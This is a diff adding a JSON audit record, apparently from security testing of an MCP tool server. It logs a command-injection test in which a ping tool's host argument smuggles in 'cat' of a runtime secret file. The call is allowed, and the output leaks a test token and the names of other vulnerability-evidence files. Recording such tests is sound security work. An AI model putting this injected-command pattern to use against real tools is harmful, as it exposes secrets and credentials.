@@ -1,0 +1,13 @@
+{
+  "audit_id": "3cf8114c3cd33ed6",
+  "run_id": "validation-full-8a62f4d1",
+  "timestamp": "2026-10-08T12:51:40.424888Z",
+  "tool": "network_ping",
+  "arguments": {
+    "host": "127.0.0.1; cat /app/logs/runtime_secret.txt"
+  },
+  "decision": "allow (permissive)",
+  "latency_ms": 16.6,
+  "result_truncated": "{'content': [{'type': 'text', 'text': 'mcpuser\\nTEST_TOKEN_2405976d60602d4b77f27fdc961070616b448963_quarantine_20260911\\naudit\\nruns\\nruntime_secret.txt\\nvuln_evidence_NEW-TCMCP-001-elicitation-credential-phishing.json\\nvuln_evidence_NEW-TCMCP-002-elicitation-url-mode-token-exfil.json\\nvuln_evidence_NEW-TCMCP-003-cache-poisoning-cross-user.json\\nvuln_evidence_NEW-TCMCP-004-mrtr-requeststate-tampering.json\\nvuln_evidence_NEW-TCMCP-005-subscriptions-unauthorized-listen.json\\nvuln_evidence_NEW-TCMC",
+  "scenario_name": "TCMCP-403-command-injection-advanced"
+}
